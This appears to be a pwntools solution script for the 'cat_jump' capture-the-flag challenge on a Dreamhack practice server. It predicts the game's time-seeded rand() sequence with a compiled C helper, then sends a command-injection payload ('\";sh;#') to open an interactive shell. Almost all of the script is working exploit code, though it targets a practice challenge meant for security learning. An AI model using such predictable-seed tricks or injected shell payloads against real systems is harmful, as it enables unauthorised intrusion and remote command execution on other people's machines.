#!/usr/bin/env python3
from pwn import *
import os

SOLVER_SOURCE = '''
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define CAT_JUMP_GOAL 37

int main(void) {
    char buf[CAT_JUMP_GOAL * 2 + 1];
    int obstacle;
    srand(time(NULL));
    for (int i = 0; i < CAT_JUMP_GOAL; i++) {
        obstacle = rand() % 2;
        buf[i*2] = obstacle ? 'h' : 'l';
        buf[i*2 + 1] = '\\n';
        rand();
    } 
    buf[CAT_JUMP_GOAL * 2] = '\\0';
    printf("%s", buf);
    return 0;
}
'''

def compile_solver():
    if not os.path.exists("./solver"):
        f = open("solver.c", "w")
        f.write(SOLVER_SOURCE)
        f.close()
        os.system("gcc -o solver solver.c")

exe = ELF("./deploy/cat_jump")

context.binary = exe

def conn():
    if args.LOCAL:
        return process([exe.path])
    return remote("host8.dreamhack.games", 16925)

def main():
    compile_solver()

    p = process("./solver")
    answer = p.recvall()
    p.close()

    r = conn()

    r.send(answer)

    r.recvuntil(b"your cat has reached the roof!\n")
    r.sendline(b"\";sh;#")

    r.interactive()

if __name__ == "__main__":
    main()